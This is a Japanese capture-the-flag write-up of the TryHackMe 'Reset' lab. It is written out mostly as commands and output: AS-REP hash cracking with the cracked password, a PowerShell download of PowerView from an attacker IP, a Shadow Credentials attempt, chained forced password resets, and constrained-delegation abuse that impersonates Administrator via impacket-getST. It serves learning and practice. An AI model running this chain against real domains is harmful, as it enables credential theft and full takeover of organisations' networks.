$krb5asrep$23$LEANN_LONG@THM.CORP:da70970404edc3b81773dea7a4adfd3d$e14909545da48308ab1e0fea31581ee5cff4ca4e77101dd4b8124a53011dde4b278fa675f50dd026b0ae4af7593333c2fd28c4b8e5a92899be2dd3e6964391ea1dc0b3e6d1803577bd49e5b12de1b2f6dae24a2d32d9927620a024b99fe36c5960ed5cec26a5d3ef5f0534b2201c05fd6625a95ac978404eee9e65e1d50d1639f7315ed5527f43d08e17842dff85dcda2479145ae9b28a3be452f7942509fe93dd23b3c0261562863c20040ca915abea65f153013e40fce28ebda498f8ff958ec20f9bed3d2a0d1de5a43bc040c9ba1dc9542ff811e9b6ab9461ffcfbb1d7371a260a
```

ハッシュをクラックする
- TABATHA_BRITTのみクラックできた
```sh
hashcat asrep_hash.txt /usr/share/wordlists/rockyou.txt

<SNIP>
$krb5asrep$23$TABATHA_BRITT@THM.CORP:6c03f42b19b9da0801ec4c1843ef30bb$485180251c7ef43746a8e615398515c403eaaed342eab9ffbb430d5ef359e836fdd0a98e8e465b80b32e2732e847af40a0e01f17d96aeeec02a9c2803eed0f0724ca455b00a77a5b0d51d82b87c75ff24939b57c2d470a9ab82170baf4bb0c897251e261838aea757841e494dfb56de7192722700c5c3b92cce636918c727ac94edaca78d3a31527e805779fda6765fe2094061cf55f7d11ca0502e9ab1c3813cf9b41e9d4eba160ac86ad578df0190ec720c561b974dcde85638d96c5e9f203395b8d301a84d2ae27dd3bb34c24886d6dfeae26435d381692f67fc38fda413c03d79895:marlboro(1985)
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: asrep_hash.txt
Time.Started.....: Mon Jun  2 16:40:24 2025 (21 secs)

<SNIP>

```


PowerView .ps1の転送
- AVにブロックされる
	- 頑張って回避できるのかな
```bash
$url = 'http://10.9.2.89:8080/PowerView.ps1'
$dest = 'C:\Users\TEMP\P.ps1'
(New-Object System.Net.WebClient).DownloadFile($url, $dest)
Test-Path $dest
. .\p.ps1
```

#### 認証情報3
TABATHA_BRITT : marlboro(1985)
- RDPできる
![](https://i.imgur.com/RR1uCxL.png)



## RDP
```sh
xfreerdp /u:TABATHA_BRITT /p:"marlboro(1985)" /v:10.10.73.63 /cert:ignore
```
RDPにログインできた
![](https://i.imgur.com/vER9Tg8.png)


## BloodHoundでわかった流れ
![](https://i.imgur.com/Ju6VFhb.png)
### SHAWA_BRAYへの横展開
まず、SHAWA_BRAYになる

- TABATHA_BRITT@THM.CORP は、ユーザー SHAWNA_BRAY@THM.CORP に対して **GenericAll**権限を持ってる
	- 対象のオブジェクトに対して自由に操作を行うことができる
![](https://i.imgur.com/7n1omx4.png)

Linux Abuseにはいくつか攻撃手法が示されていた
- Targeted Kerberoast
	- ハッシュがクラックできるかが問題
- Force Change Password
	- 強引
- Shadow Credentials attack
	- この攻撃を行う

#### Shadow Credentialの試み
pywhiskerというツールを使う
- https://github.com/ShutdownRepo/pywhisker

実行
- 成功
```bash
└─$ pywhisker -d "haystack.thm.corp" -u "TABATHA_BRITT" -p "marlboro(1985)" --target "SHAWNA_BRAY" --action "add"
[*] Searching for the target account
[*] Target user found: CN=SHAWNA_BRAY,OU=Devices,OU=FIN,OU=Tier 1,DC=thm,DC=corp
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 7ac615b7-8619-b515-e192-2438c9481739
[*] Updating the msDS-KeyCredentialLink attribute of SHAWNA_BRAY
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 84xsTPrM.pfx
[+] PFX exportiert nach: 84xsTPrM.pfx
[i] Passwort für PFX: mBwoLW7Z3GoGmokngZxt
[+] Saved PFX (#PKCS12) certificate & key at path: 84xsTPrM.pfx
[*] Must be used with password: mBwoLW7Z3GoGmokngZxt
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

TGTを取得する
- PKINITtoolsの中のgetTGTpkinit.pyを利用する
	- https://github.com/dirkjanm/PKINITtools

エラー起きた
- Kerberos の PKINIT に必要な「証明書ベースの前認証データ」を KDC 側がサポートしていない、または有効化されていない
- このホストで、 Shadow Credentialは使えない
```bash
gettgtpkinit thm.corp/SHAWNA_BRAY -cert-pfx /home/kali/Desktop/THM/machine/reset/shadow_credential/84xsTPrM.pfx  -pfx-pass mBwoLW7Z3GoGmokngZxt -dc-ip 10.10.245.192 SHAWNA_BRAY.ccache

2025-06-03 08:07:57,178 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-03 08:07:57,193 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/home/kali/tools/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/kali/tools/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/kali/tools/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/home/kali/tools/PKINITtools/venv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 

```


#### Force Change Password
![](https://i.imgur.com/Lcphexr.png)
ここに書いてあるツールをそのまま使う

- samba の net ツールを使って、ユーザーのパスワードを変更する
何も出力されない
```bash
net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U "thm.corp\\TABATHA_BRITT%marlboro(1985)" -S 10.10.245.192
```

新しい認証情報(newP@ssword2022)でログインできた
```bash
└─$ smbclient -L //10.10.245.192 -U "thm.corp/SHAWNA_BRAY"
Password for [THM.CORP\SHAWNA_BRAY]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.245.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```


### CRUZ_HALLへの横展開
![](https://i.imgur.com/1uhh8gv.png)

攻撃手法は、ForceChangePasswordしかない
- SHAWA_BRAYの手法と同様に進める
#### ForceChangePassword
```bash
net rpc password "CRUZ_HALL" "newP@ssword2022" -U "thm.corp\SHAWNA_BRAY%newP@ssword2022" -S 10.10.245.192
```

同様に成功し、newP@ssword2022でログインできた
```sh
└─$ net rpc password "CRUZ_HALL" "newP@ssword2022" -U "thm.corp\SHAWNA_BRAY%newP@ssword2022" -S 10.10.245.192
                                                                                                                                                                               
┌──(kali㉿kali)-[~/…/THM/machine/reset/force_password]
└─$ smbclient -L //10.10.245.192 -U "thm.corp/CRUZ_HALL"                                                         
Password for [THM.CORP\CRUZ_HALL]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.

```

### DARLA_WINTERSへの横展開
![](https://i.imgur.com/iyJ5R5U.png)
Ownsというノードになっている
- ユーザー CRUZ_HALL@THM.CORP は、ユーザー DARLA_WINTERS@THM.CORP のオーナー権限（所有権）を持っている
- オブジェクトの所有者は、そのオブジェクトの アクセス制御リスト（DACL）上のパーミッションに関係なく、オブジェクトのセキュリティ記述子（アクセス権情報）を変更できる権限を持ち続ける
	- CRUZ_HALL は DARLA_WINTERS に対して 任意の権限を後付けで追加できるということ

Linux Abuseにはいくつか攻撃手法が示されていた
- Targeted Kerberoast
- Force Change Password
- Shadow Credentials attack

ここまできたら、最後もForce Change Password攻撃を行い、取得する
#### Force Change Password
上の二人の時と同様、攻撃は成功し、smbでログインできた
```sh
└─$ net rpc password "DARLA_WINTERS" "newP@ssword2022" -U "thm.corp\CRUZ_HALL%newP@ssword2022" -S 10.10.245.192
                                                                                                                                                                               
┌──(kali㉿kali)-[~/…/THM/machine/reset/force_password]
└─$  smbclient -L //10.10.245.192 -U "DARLA_WINTERS/CRUZ_HALL"
Password for [DARLA_WINTERS\CRUZ_HALL]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.

```





# Privilege Escalation
そして、最終的にDARLA_WINTERSまで横展開してきたが、どのように権限を昇格させられるのか
## 制限付き委任の悪用
- DARLA_WINTERSのNode Infoを見ていると、EXECUTION RIGHTSにConstrained Delegation Privilegesがあることがわかる
![](https://i.imgur.com/YUZrR6m.png)

![](https://i.imgur.com/OmTasyc.png)
DARLA_WINTERSは、HAYSTACK.THM.CORPに対して、AllowedToDelegate権限があることがわかる

AllowedToDelegate権限
- 制限付き委任の目的は、特定サービスへの任意ユーザーとしての認証の許可するため
	- 対象サービスは LDAP プロパティ msds-AllowedToDelegateTo に定義されたサービス
- この権限により、対象ホスト上の特定サービスへのドメインユーザー（ドメイン管理者を含む）としてのなりすましの可能
	- 制限事項として、「Protected Users」グループのメンバーなど、委任対象外に設定されたユーザーのなりすましの不可
- チケット内のサービス名（sname）が保護対象外であることによる脆弱性の存在
	- 攻撃者によるサービス名の改ざんの可能
- 特定サービス名に関係なく、サーバー全体の権限奪取に繋がる危険性

![](https://i.imgur.com/dJUaJI8.png)

```sh
次の例では、*victim* は攻撃者が制御するアカウント（つまり、ハッシュが既知）であり、**制限付き委任（constrained delegation）**が設定されています。
つまり、*victim* の msds-AllowedToDelegateTo プロパティには、サービスプリンシパル名（SPN）として "HTTP/PRIMARY.testlab.local" が設定されています。

このコマンドはまず、*victim* ユーザーの TGT（チケット取得チケット） を要求し、S4U2self/S4U2proxy プロセスを実行して、 "HTTP/PRIMARY.testlab.local" SPN に対して "admin" ユーザーをなりすまし（インパーソネート）します。

最後に、代替サービス名 "cifs" が最終的なサービスチケットに挿入されます。
これにより攻撃者は、“admin” ユーザーとして PRIMARY.testlab.local のファイルシステムへアクセス可能になります。
```
割り当てられてる制限付き委任
![](https://i.imgur.com/NCSjb2I.png)

割り当てられてる制限付き委任
```sh
cifs/HayStack.thm.corp/thm.corp
cifs/HayStack.thm.corp
cifs/HAYSTACK
cifs/HayStack.thm.corp/THM
cifs/HAYSTACK/THM
```

impacket-getSTツールでの攻撃が可能とのこと
- https://www.kali.org/tools/impacket-scripts/#impacket-getst

Administratorユーザーへ権限昇格する
- 攻撃成功
	- TGSの.ccacheが取得できたので、TGT攻撃が可能？
```sh
└─$ impacket-getST -spn 'cifs/HayStack.thm.corp' -dc-ip 10.10.245.192 -impersonate 'Administrator' 'THM.CORP/DARLA_WINTERS'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
```

## PtT
AdministratorのTGSをセット
```sh
export KRB5CCNAME=Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
```

Administratorで接続
smbclientでは使用できないので、impacket-smbclientで接続
```sh
impacket-smbclient -k -no-pass THM.CORP/Administrator@HayStack.thm.corp

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
Data
IPC$
NETLOGON
SYSVOL

# use C$
# cd Users
# cd Administrator
# cd Desktop
# ls
drw-rw-rw-          0  Fri Jan 26 13:22:21 2024 .
drw-rw-rw-          0  Fri Jan 26 13:22:21 2024 ..
-rw-rw-rw-        282  Fri Jan 26 13:22:21 2024 desktop.ini
-rw-rw-rw-        527  Fri Jan 26 13:22:21 2024 EC2 Feedback.website
-rw-rw-rw-        554  Fri Jan 26 13:22:21 2024 EC2 Microsoft Windows Guide.website
-rw-rw-rw-         30  Fri Jan 26 13:22:21 2024 root.txt
# get root.txt
```



# 反省

## 詰まったポイント
- SMBの匿名ログインから、認証情報1のヒントが見つかり、hydraでLDAPでのCNの認証情報を取得できたが、DNがわからず、かつ認証情報からの辞書の拡張でDNを取得しようと試みたが、失敗に終わった。
	- DNを知るためには、ldapsearchで検索する必要があるが、ldapsearchは匿名では利用できない環境であり、検索するために、認証情報が必要というループに陥った。
- また、利用できる認証情報を使用し、WinRM、RDPでの認証を試みたが、WinRMはLILY_ONEILLにリモート権限がないのか、使用できない
- RDPは、パスワードが期限切れ（または初回ログイン時に変更を要求されている）とのことだが、これをRDPで治すことはできず、LDAPプロトコル上でのパスワード変更が必要だが、ldapを利用するための認証情報がわからず、変更することができない
- また、LILY_ONEILLを利用して、AS-REP Roastingができるか、Kereberoasdtingができるかを試みたが、ともにできなかった

　以上のことから、これ以上どのように進めていけばいいのかわからず詰まった

## Writeupを見て、新たに得たポイント
- WriteUPリンク : https://0xb0b.gitbook.io/writeups/tryhackme/2024/reset

自分も知っていたこと
- SMBのファイル名が頻繁に書き換わっている

新たに得たこと
- smbへの書き込み権限の確認という不足
- ADと同じネットワーク上にあるため、Responderが使えるという視点
	- 言い訳
		- responderはなんか親友先で使うという勝手な偏見があったが、確かに使えるね
- smbのファイル名が頻繁に書き換わっている
	- →**他のユーザー**が書き換えているという発想
